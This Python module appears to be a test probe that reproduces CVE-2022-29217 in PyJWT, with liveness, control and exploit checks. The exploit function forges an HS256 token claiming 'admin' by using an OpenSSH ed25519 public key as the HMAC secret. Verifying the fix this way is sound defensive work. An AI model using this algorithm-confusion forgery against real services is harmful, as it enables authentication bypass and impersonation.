"""CVE-2022-29217 -- PyJWT accepts a public key as an HMAC secret (2.3.0 -> 2.4.0).

2.3.0's ``HMACAlgorithm.prepare_key`` rejected four literal strings, one of which
was ``ssh-rsa``. An OpenSSH-format ed25519 public key is not in that list, so a
key that is public by design could be used as a symmetric secret -- the classic
algorithm-confusion shape, where anyone who knows the public key can mint tokens
the verifier accepts.

Oracle, declared before execution: ``jwt.decode`` returns a verified claim set
for a token signed HS256 with the *public* key as the secret. The observable is
a signature verification that succeeded, not any text the probe supplied.

The key pair is generated in-process and thrown away. Only the public half is
used, and nothing is written to disk, so no key material is introduced anywhere.
"""

from __future__ import annotations

import os

from ._support import pinned_version

DIST = "pyjwt"
MODULE = "jwt"


def _ssh_public_key() -> bytes:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import ed25519

    private = ed25519.Ed25519PrivateKey.generate()
    return private.public_key().public_bytes(
        serialization.Encoding.OpenSSH, serialization.PublicFormat.OpenSSH
    )


def liveness(ctx: dict) -> tuple[bool, str]:
    """HS256 must work with an ordinary secret, and the pin must be the pin."""
    origin = pinned_version(DIST, MODULE, ctx["version"], ctx["pin_dir"])
    import jwt

    token = jwt.encode({"sub": "alice"}, "an-ordinary-shared-secret", algorithm="HS256")
    claims = jwt.decode(token, "an-ordinary-shared-secret", algorithms=["HS256"])
    ok = claims == {"sub": "alice"}
    return ok, f"benign HS256 round trip -> {claims} from {os.path.basename(origin)}"


def control(ctx: dict) -> tuple[bool, str]:
    """A PEM public key as the HMAC secret. Both pins must REFUSE this.

    This is the honest control: the vulnerability is that the blocklist was
    incomplete, so the part of it that already worked must be shown to work. If
    this fired, the probe would be measuring "HMAC accepts anything" rather than
    the gap the fix closed.
    """
    import jwt
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import ed25519

    pem = (
        ed25519.Ed25519PrivateKey.generate()
        .public_key()
        .public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    )
    try:
        token = jwt.encode({"sub": "admin"}, pem, algorithm="HS256")
        jwt.decode(token, pem, algorithms=["HS256"])
    except Exception as exc:
        return False, f"PEM public key refused as HMAC secret: {type(exc).__name__}: {exc}"
    return True, "PEM public key was accepted as an HMAC secret"


def exploit(ctx: dict) -> tuple[bool, str]:
    import jwt

    key = _ssh_public_key()
    try:
        token = jwt.encode({"sub": "admin"}, key, algorithm="HS256")
        claims = jwt.decode(token, key, algorithms=["HS256"])
    except Exception as exc:
        return False, f"refused: {type(exc).__name__}: {exc}"
    return True, f"ssh-ed25519 public key accepted as HMAC secret; verified claims={claims}"
